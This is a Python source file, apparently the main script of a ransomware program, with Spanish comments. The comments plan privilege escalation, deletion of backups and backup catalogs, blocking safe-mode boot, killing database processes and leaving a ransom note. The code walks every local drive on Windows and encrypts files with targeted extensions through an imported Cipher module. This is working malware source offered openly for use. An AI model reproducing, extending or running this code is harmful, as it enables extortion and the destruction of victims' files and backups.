from Cipher import Cipher
import os
import sys

# Secuencia de acciones del Ransomware
# Paso 1 - En que sistema operativo o entorno se esta ejecutando el malware
# Paso 2 - Averiguar que sistemas de almacenamiento hay disponibles
# Paso 3 - Vamos a elevar privilegios, y daremos al programa los permisos de 'Full Control'
# Paso 4 - Necesitamos eliminar las copias de seguridad
# Paso 5 - Impedir que el sistema operativo reinicie en modo seguro
# Paso 6 - Borraremos los catalogos de las copias de seguridad
# Paso 7 - Miraremos de matar los procesos con bases de datos para garantizar el cifrado de estas
# Paso 8 - Dada la lista de dispositivos locales vamos a ir cifrando aquello que nos interese uno a uno (podemos mantener un set de extensiones o un set de carpetas de especial interes)
# Paso 9 - Una vez hemos encriptado todo debemos disponer la nota de rescate garantizando que se pueda realizar el pago

# Algunas preguntas
# a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos

if __name__ == '__main__':
    cipher = Cipher(action='encrypt')
    cipher.save_key_as_file()

    if not cipher.is_windows():
        print('Nothing to do here')
        sys.exit()

    local_drives = cipher.get_local_drives()
    
    for ld in local_drives:
        for root, dirs, files in os.walk(ld):
            [dirs.remove(d) for d in list(dirs) if d in cipher.PROTECTED_DIRS]
            for fn in files:
                full_path = root + os.sep + fn
                ext=cipher.get_file_extension(full_path)
                if ext in cipher.TARGET_EXT and ext not in cipher.EXCLUDED_EXT:
                    print(full_path + ' -> [encrypted]')
                    cipher.symmetric_encrypt_or_decrypt(full_path)

    print('All data was successfully encrypted')

    


    

